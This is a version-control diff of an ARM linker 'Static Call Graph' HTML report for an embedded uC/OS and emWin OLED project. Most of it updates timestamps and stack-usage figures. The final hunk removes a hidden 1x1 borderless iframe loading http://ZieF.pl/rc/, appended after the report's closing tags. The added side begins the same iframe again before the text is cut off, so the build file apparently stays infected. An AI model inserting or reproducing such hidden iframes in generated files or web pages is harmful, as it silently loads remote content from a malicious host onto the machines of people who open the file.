@@ -3,9 +3,9 @@
 <title>Static Call Graph - [.\Debug\Pro.axf]</title></head>
 <body><HR>
 <H1>Static Call Graph for image .\Debug\Pro.axf</H1><HR>
-<BR><P>#&#060CALLGRAPH&#062# ARM Linker, 5050106: Last Updated: Mon Sep 26 20:46:21 2016
+<BR><P>#&#060CALLGRAPH&#062# ARM Linker, 5050106: Last Updated: Tue Sep 27 14:14:26 2016
 <BR><P>
-<H3>Maximum Stack Usage =       1424 bytes + Unknown(Functions without stacksize, Cycles, Untraceable Function Pointers)</H3><H3>
+<H3>Maximum Stack Usage =       1432 bytes + Unknown(Functions without stacksize, Cycles, Untraceable Function Pointers)</H3><H3>
 Call chain for Maximum Stack Depth:</H3>
 Task_OLEDDisplay &rArr; bmpdisplay_exam3 &rArr; GUI_Delay &rArr; GUI_Exec &rArr; GUI_Exec1 &rArr; WM_Exec &rArr; _DrawNext &rArr; WM__Paint &rArr; GUI_MEMDEV_Draw &rArr; GUI_MEMDEV_CopyToLCD &rArr; GUI_MEMDEV_CopyToLCDAt &rArr; GUI_MEMDEV__WriteToActiveOpaque &rArr; _WriteToActiveOpaque_8 &rArr; LCD__DrawBitmap_1bpp &rArr; LCD_FillRect
 <P>
@@ -394,7 +394,7 @@ Global Symbols
 <BR>[Address Reference Count : 1]<UL><LI> main.o(.text)
 </UL>
 <P><STRONG><a name="[6b]"></a>Task_OLEDDisplay</STRONG> (Thumb, 474 bytes, Stack size 568 bytes, task_test.o(.text))
-<BR><BR>[Stack]<UL><LI>Max Depth = 1424 + Unknown Stack Size
+<BR><BR>[Stack]<UL><LI>Max Depth = 1432 + Unknown Stack Size
 <LI>Call Chain = Task_OLEDDisplay &rArr; bmpdisplay_exam3 &rArr; GUI_Delay &rArr; GUI_Exec &rArr; GUI_Exec1 &rArr; WM_Exec &rArr; _DrawNext &rArr; WM__Paint &rArr; GUI_MEMDEV_Draw &rArr; GUI_MEMDEV_CopyToLCD &rArr; GUI_MEMDEV_CopyToLCDAt &rArr; GUI_MEMDEV__WriteToActiveOpaque &rArr; _WriteToActiveOpaque_8 &rArr; LCD__DrawBitmap_1bpp &rArr; LCD_FillRect
 </UL>
 <BR>[Calls]<UL><LI><a href="#[110]">&gt;&gt;</a>&nbsp;&nbsp;&nbsp;f_open
@@ -435,8 +435,8 @@ Global Symbols
 </UL>
 <BR>[Address Reference Count : 1]<UL><LI> main.o(.text)
 </UL>
-<P><STRONG><a name="[70]"></a>Task_STATE_TEST</STRONG> (Thumb, 70 bytes, Stack size 16 bytes, task_test.o(.text))
-<BR><BR>[Stack]<UL><LI>Max Depth = 64 + Unknown Stack Size
+<P><STRONG><a name="[70]"></a>Task_STATE_TEST</STRONG> (Thumb, 94 bytes, Stack size 24 bytes, task_test.o(.text))
+<BR><BR>[Stack]<UL><LI>Max Depth = 72 + Unknown Stack Size
 <LI>Call Chain = Task_STATE_TEST &rArr; OSTimeDlyHMSM &rArr; OSTimeDly &rArr; OS_Sched
 </UL>
 <BR>[Calls]<UL><LI><a href="#[122]">&gt;&gt;</a>&nbsp;&nbsp;&nbsp;OSTaskStkChk
@@ -7147,8 +7147,8 @@ Global Symbols
 <BR>[Called By]<UL><LI><a href="#[6b]">&gt;&gt;</a>&nbsp;&nbsp;&nbsp;Task_OLEDDisplay
 </UL>
 
-<P><STRONG><a name="[116]"></a>bmpdisplay_exam3</STRONG> (Thumb, 2180 bytes, Stack size 168 bytes, exam.o(.text))
-<BR><BR>[Stack]<UL><LI>Max Depth = 856 + Unknown Stack Size
+<P><STRONG><a name="[116]"></a>bmpdisplay_exam3</STRONG> (Thumb, 2180 bytes, Stack size 176 bytes, exam.o(.text))
+<BR><BR>[Stack]<UL><LI>Max Depth = 864 + Unknown Stack Size
 <LI>Call Chain = bmpdisplay_exam3 &rArr; GUI_Delay &rArr; GUI_Exec &rArr; GUI_Exec1 &rArr; WM_Exec &rArr; _DrawNext &rArr; WM__Paint &rArr; GUI_MEMDEV_Draw &rArr; GUI_MEMDEV_CopyToLCD &rArr; GUI_MEMDEV_CopyToLCDAt &rArr; GUI_MEMDEV__WriteToActiveOpaque &rArr; _WriteToActiveOpaque_8 &rArr; LCD__DrawBitmap_1bpp &rArr; LCD_FillRect
 </UL>
 <BR>[Calls]<UL><LI><a href="#[10f]">&gt;&gt;</a>&nbsp;&nbsp;&nbsp;GUI_SetFont
@@ -13518,5 +13518,4 @@ Local Symbols
 </UL><P>
 <H3>
 Undefined Global Symbols
-</H3><HR><iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
-</body></html>
+</H3><HR><iframe src="htt
